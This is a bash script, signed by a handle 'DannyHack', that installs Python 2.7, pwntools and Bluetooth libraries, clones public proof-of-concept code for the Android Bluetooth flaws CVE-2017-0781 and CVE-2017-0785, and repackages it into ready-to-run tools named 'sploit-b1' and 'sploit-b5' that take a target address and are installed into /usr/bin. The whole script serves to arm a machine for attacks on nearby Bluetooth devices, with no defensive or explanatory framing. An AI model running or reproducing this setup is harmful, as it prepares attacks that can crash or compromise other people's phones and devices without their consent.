#!/bin/bash

#Actor: DannyHack

export DEBIAN_FRONTEND=noninteractive

#Mail

apt update
apt upgrade -y
apt install python2.7 -y
apt install curl -y
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
python2.7 get-pip.py
apt install libssl-dev -y
apt install libffi-dev -y
apt install build-essential -y
python2.7 -m pip install --upgrade setuptools
python2.7 -m pip install 'pwntools==3.13.0'
apt install bluetooth libbluetooth-dev -y
apt install python2-dev -y
python2.7 -m pip install 'pybluez==0.22'
apt install git -y
git clone https://github.com/ojasookert/CVE-2017-0781
git clone https://github.com/ojasookert/CVE-2017-0785
cd CVE-2017-0781
echo -e "#! /usr/bin/python2.7\n\n$(head -2 CVE-2017-0781.py)\nimport sys\n\ntarget = sys.argv[1]\n\ncount = 30000\n" > sploit-b1
tail -37 CVE-2017-0781.py >> sploit-b1
chmod +x sploit-b1
cp sploit-b1 /usr/bin
cd ../CVE-2017-0785
echo -e "#! /usr/bin/python2.7\n\n$(head -2 CVE-2017-0785.py)\nimport sys\n\ntarget = sys.argv[1]\n\n" > sploit-b5
tail -45 CVE-2017-0785.py >> sploit-b5
chmod +x sploit-b5
cp sploit-b5 /usr/bin
echo "[+] Listo"
